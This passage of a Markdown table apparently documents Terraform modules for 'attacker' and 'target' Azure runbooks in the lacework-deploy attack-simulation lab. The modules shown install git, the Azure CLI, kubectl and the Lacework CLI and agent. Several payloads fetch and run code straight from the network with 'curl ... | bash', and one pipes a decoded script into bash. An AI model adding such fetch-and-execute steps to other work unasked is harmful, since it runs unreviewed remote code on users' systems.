| attacker-runbook-deploy-git                              | ./modules/runbook/deploy-git                         | runbook_deploy_git                               | context.azure.runbook.deploy_git                                  | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_git&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-git                         | <pre>locals \{<br/>    tool=&quot;git&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;Checking for $\{local\.tool\}\.\.\.&quot;<br/>     if \! command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>        log &quot;$\{local\.tool\} not found installation required&quot;<br/>    fi<br/>    log &quot;$\{local\.tool\} path: $\(command \-v  $\{local\.tool\}\)&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        if command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt\_packages = &quot;git&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        if command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum\_packages = &quot;git&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| attacker-runbook-azure-cli                               | ./modules/runbook/deploy-azure-cli                   | runbook_deploy_azure_cli                         | context.azure.runbook.deploy_azure_cli                            | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_azure_cli&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-azure-cli                   | <pre>locals \{<br/>    tool=&quot;az&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;Checking for $\{local\.tool\}\.\.\.&quot;<br/>    if \! command \-v $\{local\.tool\}; then<br/>        log &quot;$\{local\.tool\} not found installation required&quot;<br/>        curl \-sL https://aka\.ms/InstallAzureCLIDeb \| bash <br/>    fi<br/>    log &quot;$\{local\.tool\} path: $\(command \-v $\{local\.tool\}\)&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        if command $\{local\.tool\}; then<br/>            log &quot;$\{local\.tool\} found installation not required&quot;<br/>            exit 0<br/>        fi<br/>        EOT<br/>        apt\_packages = &quot;jq&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks = &lt;&lt;\-EOT<br/>        if command $\{local\.tool\}; then<br/>            log &quot;$\{local\.tool\} found installation not required&quot;<br/>            exit 0<br/>        fi<br/>        EOT<br/>        yum\_packages = &quot;jq&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/>    <br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| attacker-runbook-lacework-cli                            | ./modules/runbook/deploy-lacework-cli                | runbook_deploy_lacework_cli                      | context.azure.runbook.deploy_lacework_cli                         | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_lacework_cli&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-cli                | <pre>locals \{<br/>    tool=&quot;lacework&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;Checking for $\{local\.tool\}\.\.\.&quot;<br/>    if \! command \-v $\{local\.tool\}; then<br/>        log &quot;$\{local\.tool\} not found installation required&quot;<br/>        curl https://raw\.githubusercontent\.com/lacework/go\-sdk/main/cli/install\.sh \| bash<br/>    fi<br/>    log &quot;$\{local\.tool\} path: $\(command \-v  $\{local\.tool\}\)&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        if command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt\_packages = &quot;jq&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        if command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum\_packages = &quot;jq&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| attacker-runbook-kubectl-cli                             | ./modules/runbook/deploy-kubectl-cli                 | runbook_deploy_kubectl_cli                       | context.azure.runbook.deploy_kubectl_cli                          | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_kubectl_cli&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-kubectl-cli                 | <pre>locals \{<br/>    tool=&quot;kubectl&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;Checking for $\{local\.tool\}\.\.\.&quot;<br/>    if \! command \-v $\{local\.tool\}; then<br/>        log &quot;$\{local\.tool\} not found installation required&quot;<br/>        curl \-LO &quot;https://storage\.googleapis\.com/kubernetes\-release/release/$\(curl \-s https://storage\.googleapis\.com/kubernetes\-release/release/stable\.txt\)/bin/linux/amd64/kubectl&quot;<br/>        sudo install \-o root \-g root \-m 0755 kubectl /usr/local/bin/kubectl<br/>    fi<br/>    log &quot;$\{local\.tool\} path: $\(command \-v  $\{local\.tool\}\)&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        if command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt\_packages = &quot;jq&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        if command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum\_packages = &quot;jq&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| target-runbook-deploy-lacework                           | ./modules/runbook/deploy-lacework-agent              | runbook_deploy_lacework                          | context.azure.runbook.deploy_lacework_agent                       | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_lacework_agent&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-agent              | <pre>locals \{<br/>    tool = &quot;lacework&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;Starting\.\.\.&quot;<br/>    if \[ \-f /var/lib/lacework/config/config\.json \] &amp;&amp; pgrep datacollector &gt; /dev/null; then<br/>        log &quot;lacework already installed \- nothing to do&quot;<br/>    else<br/>        log &quot;lacework not installed \- installing\.\.\.&quot;<br/>        echo &#x27;$\{base64gzip\(local\.setup\_lacework\_agent\)\}&#x27; \| base64 \-d \| gunzip \| /bin/bash \-<br/>    fi<br/>    log &quot;done\.&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        if \[ \-f /var/lib/lacework/config/config\.json \] &amp;&amp; pgrep datacollector &gt; /dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        if \[ \-f /var/lib/lacework/config/config\.json \] &amp;&amp; pgrep datacollector &gt; /dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    setup\_lacework\_agent = templatefile\(&quot;$\{path\.module\}/resources/setup\_lacework\_agent\.sh&quot;, \{<br/>        LaceworkInstallPath=&quot;/var/lib/lacework&quot;<br/>        LaceworkTempPath=var\.inputs\[&quot;lacework\_agent\_temp\_path&quot;\]<br/>        Tags=jsonencode\(var\.inputs\[&quot;lacework\_agent\_tags&quot;\]\)<br/>        Hash=&quot;&quot;<br/>        Serverurl=var\.inputs\[&quot;lacework\_server\_url&quot;\]<br/>        Token=try\(length\(var\.inputs\[&quot;lacework\_agent\_access\_token&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;lacework\_agent\_access\_token&quot;\] : lacework\_agent\_access\_token\.agent\[0\]\.token<br/>    \}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_setup\_lacework\_agent\.sh&quot;<br/>                content = base64encode\(local\.setup\_lacework\_agent\)<br/>            \}<br/>        \]<br/>    \}<br/>\}<br/><br/>\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br/>\# LACEWORK AGENT<br/>\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br/><br/>resource &quot;random\_string&quot; &quot;this&quot; \{<br/>    length            = 4<br/>    special           = false<br/>    upper             = false<br/>    lower             = true<br/>    numeric           = true<br/>\}<br/><br/>resource &quot;lacework\_agent\_access\_token&quot; &quot;agent&quot; \{<br/>    count = try\(length\(var\.inputs\[&quot;lacework\_agent\_access\_token&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? 0 : 1<br/>    name = &quot;endpoint\-agent\-access\-token\-$\{random\_string\.this\.id\}\-$\{var\.inputs\[&quot;environment&quot;\]\}\-$\{var\.inputs\[&quot;deployment&quot;\]\}&quot;<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| target-runbook-deploy-lacework-syscall-config            | ./modules/runbook/deploy-lacework-syscall-config     | runbook_deploy_lacework_syscall                  | context.azure.runbook.deploy_lacework_syscall_config              | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_lacework_syscall_config&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-syscall-config     | <pre>locals \{<br/>    tool = &quot;lacework\-sycall\-config&quot;<br/>    lacework\_install\_path = &quot;/var/lib/lacework&quot;<br/>    lacework\_syscall\_config\_path = &quot;$\{local\.lacework\_install\_path\}/config/syscall\_config\.yaml&quot;<br/>    syscall\_config = file\(var\.inputs\[&quot;syscall\_config&quot;\]\)<br/>    base64\_syscall\_config = local\.syscall\_config<br/>    hash\_syscall\_config = sha256\(local\.syscall\_config\)<br/>    payload = &lt;&lt;\-EOT<br/>    LACEWORK\_INSTALL\_PATH=&quot;$\{local\.lacework\_install\_path\}&quot;<br/>    LACEWORK\_SYSCALL\_CONFIG\_PATH=$\{local\.lacework\_syscall\_config\_path\}<br/>    <br/>    \# Check if Lacework is pre\-installed\. If installed, add syscall\_config\.yaml\.<br/>    if \[ \-f &quot;$LACEWORK\_INSTALL\_PATH/datacollector&quot; \]; then<br/>        log &quot;Lacework agent is installed, adding syscall\_config\.yaml\.\.\.&quot;<br/>        if echo &quot;$\{local\.hash\_syscall\_config\}  $LACEWORK\_SYSCALL\_CONFIG\_PATH&quot; \| sha256sum \-\-check \-\-status; then <br/>            log &quot;Lacework syscall\_config\.yaml unchanged&quot;; <br/>        else <br/>            log &quot;Lacework syscall\_config\.yaml requires update&quot;<br/>            echo \-n &quot;$\{base64gzip\(local\.base64\_syscall\_config\)\}&quot; \| base64 \-d \| gunzip &gt; $LACEWORK\_SYSCALL\_CONFIG\_PATH<br/>        fi<br/>        log &quot;Lacework agent is installed, adding disable aggregation config\.\.\.&quot;<br/>        file\_path=&quot;/var/lib/lacework/config/config\.json&quot;<br/><br/>        log &quot;Checking for ebpf aggregate\_events disabled\.\.\.&quot;<br/>        grep \-q &#x27;&quot;ebpf&quot;\[\[:space:\]\]\*:\[\[:space:\]\]\*\{\[\[:space:\]\]\*&quot;aggregate\_events&quot;\[\[:space:\]\]\*:\[\[:space:\]\]\*&quot;false&quot;\[\[:space:\]\]\*\}&#x27; $file\_path<br/>        if \[ $? \-ne 0 \]; then<br/>            log &quot;ebpf aggregate\_events not currently disabled\.\.\.&quot;<br/>            grep \-q &#x27;&quot;ebpf&quot;\[\[:space:\]\]\*:\[\[:space:\]\]\*\{\[^\}\]\*\}&#x27; $file\_path<br/>            if \[ $? \-eq 0 \]; then<br/>                log &quot;Found existing ebpf config \- updating\.\.\.&quot;<br/>                sed \-i &#x27;s/&quot;ebpf&quot;\[\[:space:\]\]\*:\[\[:space:\]\]\*\{\[^\}\]\*\}/&quot;ebpf&quot;: \{&quot;aggregate\_events&quot;: &quot;false&quot;\}/&#x27; $file\_path<br/>            else<br/>                log &quot;No existing ebpf config \- appending\.\.\.&quot;<br/>                sed \-i &#x27;1s/\{/\{\\n  &quot;ebpf&quot;: \{&quot;aggregate\_events&quot;: &quot;false&quot;\},/&#x27; $file\_path<br/>            fi<br/>        else<br/>            log &quot;ebpf aggregate\_events already enabled\.&quot;<br/>        fi<br/>    fi<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        while \! \[ \-f /var/lib/lacework/config/config\.json \]; do<br/>            log &quot;lacework installation not found \- waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        while \! \[ \-f /var/lib/lacework/config/config\.json \]; do<br/>            log &quot;lacework installation not found \- waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| target-runbook-deploy-lacework-code-aware-agent          | ./modules/runbook/deploy-lacework-code-aware-agent   | runbook_deploy_lacework_code_aware_agent         | context.azure.runbook.deploy_lacework_code_aware_agent            | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_lacework_code_aware_agent&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-code-aware-agent   | <pre>locals \{<br/>    tool = &quot;lacework\-codeware\-agent&quot;<br/>    lacework\_install\_path = &quot;/var/lib/lacework&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    LACEWORK\_INSTALL\_PATH=&quot;$\{local\.lacework\_install\_path\}&quot;  <br/>    <br/>    \# Check if Lacework is pre\-installed\. If installed, add code aware agent config\.<br/>    if \[ \-f &quot;$LACEWORK\_INSTALL\_PATH/datacollector&quot; \]; then<br/>        log &quot;Lacework agent is installed, adding code aware agent config\.\.\.&quot;<br/>        file\_path=&quot;/var/lib/lacework/config/config\.json&quot;<br/>        <br/>        log &quot;Checking for codeaware agent config enable\.\.\.&quot;<br/>        grep \-q &#x27;&quot;codeaware&quot;\[\[:space:\]\]\*:\[\[:space:\]\]\*\{\[\[:space:\]\]\*&quot;enable&quot;\[\[:space:\]\]\*:\[\[:space:\]\]\*&quot;all&quot;\[\[:space:\]\]\*\}&#x27; $file\_path<br/>        if \[ $? \-ne 0 \]; then<br/>            log &quot;Code aware agent not currently enabled\.\.\.&quot;<br/>            grep \-q &#x27;&quot;codeaware&quot;\[\[:space:\]\]\*:\[\[:space:\]\]\*\{\[^\}\]\*\}&#x27; $file\_path<br/>            if \[ $? \-eq 0 \]; then<br/>                log &quot;Found existing codeaware config \- updating\.\.\.&quot;<br/>                sed \-i &#x27;s/&quot;codeaware&quot;\[\[:space:\]\]\*:\[\[:space:\]\]\*\{\[^\}\]\*\}/&quot;codeaware&quot;: \{&quot;enable&quot;: &quot;all&quot;\}/&#x27; $file\_path<br/>            else<br/>                log &quot;No existing codeaware config \- appending\.\.\.&quot;<br/>                sed \-i &#x27;1s/\{/\{\\n  &quot;codeaware&quot;: \{&quot;enable&quot;: &quot;all&quot;\},/&#x27; $file\_path<br/>            fi<br/>        else<br/>            log &quot;Code aware agent config already enabled\.&quot;<br/>        fi<br/>    fi<br/>    log &quot;Done&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        while \! \[ \-f /var/lib/lacework/config/config\.json \]; do<br/>            log &quot;lacework installation not found \- waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        while \! \[ \-f /var/lib/lacework/config/config\.json \]; do<br/>            log &quot;lacework installation not found \- waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        yum\_packages = 